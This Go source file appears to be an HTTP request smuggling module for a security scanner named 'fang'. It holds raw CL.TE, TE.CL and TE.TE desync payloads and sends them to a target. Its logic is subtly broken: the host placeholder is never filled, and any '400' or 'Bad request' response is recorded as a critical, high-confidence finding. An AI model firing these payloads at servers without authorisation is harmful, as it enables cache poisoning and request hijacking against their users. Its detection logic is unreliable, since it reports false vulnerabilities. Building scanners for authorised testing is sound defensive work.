package smuggler

import (
	"context"
	"fmt"
	"strings"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
)

type SmugglerModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *SmugglerModule) ID() string   { return "smuggler" }
func (m *SmugglerModule) Name() string { return "HTTP Request Smuggling Module" }
func (m *SmugglerModule) Description() string {
	return "CL/TE, TE/CL, TE/TE, HTTP/2 downgrade desync attacks"
}
func (m *SmugglerModule) Severity() models.Severity { return models.Critical }

func (m *SmugglerModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

var smugglePatterns = []struct {
	name   string
	prefix string
	suffix string
	check  string
}{
	{name: "CL.TE", prefix: "POST /{} HTTP/1.1\r\nHost: {}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG", check: "G"},
	{name: "TE.CL", prefix: "POST /{} HTTP/1.1\r\nHost: {}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\n\r\nSMUGGLED\r\n0\r\n\r\n", check: "SMUGGLED"},
	{name: "TE.TE", prefix: "POST /{} HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\n", check: "SMUGGLED"},
}

func (m *SmugglerModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding

	host := target.Domain
	path := "/"

	for _, sp := range smugglePatterns {
		smuggleBody := strings.ReplaceAll(sp.prefix, "{}", path)
		smuggleBody = strings.ReplaceAll(smuggleBody, "{}", host)
		smuggleBody += sp.suffix

		req := fanghttp.NewRequest("POST", target.URL)
		req.Body = smuggleBody
		req.Headers["Content-Type"] = "text/plain"
		req.Headers["Transfer-Encoding"] = "chunked"

		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}

		for _, check := range []string{"SMUGGLED", "Unrecognized method", "Bad request", "400"} {
			if strings.Contains(resp.Body, check) || strings.Contains(resp.Status, check) {
				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("HTTP Request Smuggling - %s", sp.name),
					Severity:    models.Critical,
					Confidence:  models.HighConfidence,
					URL:         target.URL,
					Payload:     smuggleBody[:min(len(smuggleBody), 200)],
					Evidence:    fmt.Sprintf("Smuggling pattern detected: %s (HTTP status: %d)", check, resp.StatusCode),
					Description: fmt.Sprintf("Target is vulnerable to %s HTTP request smuggling. Front-end and back-end disagree on request boundary.", sp.name),
					Remediation: "Ensure consistent HTTP parsing between proxy and backend. Disable Transfer-Encoding on front-end. Use HTTP/2 end-to-end.",
					CWEID:       "CWE-444",
					ModuleID:    "smuggler",
				})
				break
			}
		}
	}

	clBody := "POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG"
	req := fanghttp.NewRequest("POST", target.URL)
	req.Body = clBody
	req.Headers["Content-Length"] = fmt.Sprintf("%d", len(clBody))
	resp2, err := m.client.Do(req)
	if err == nil {
		if resp2.StatusCode == 200 && strings.Contains(resp2.Body, "G") {
			findings = append(findings, &models.Finding{
				Title:       "HTTP Request Smuggling - CL.TE Variant",
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("CL.TE smuggling succeeded: status %d", resp2.StatusCode),
				Description: "Target interprets Content-Length while backend uses Transfer-Encoding: chunked.",
				Remediation: "Reject requests with conflicting Content-Length and Transfer-Encoding headers.",
				CWEID:       "CWE-444",
				ModuleID:    "smuggler",
			})
		}
	}

	return findings, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func init() {
	engine.GetRegistry().Register(&SmugglerModule{})
}
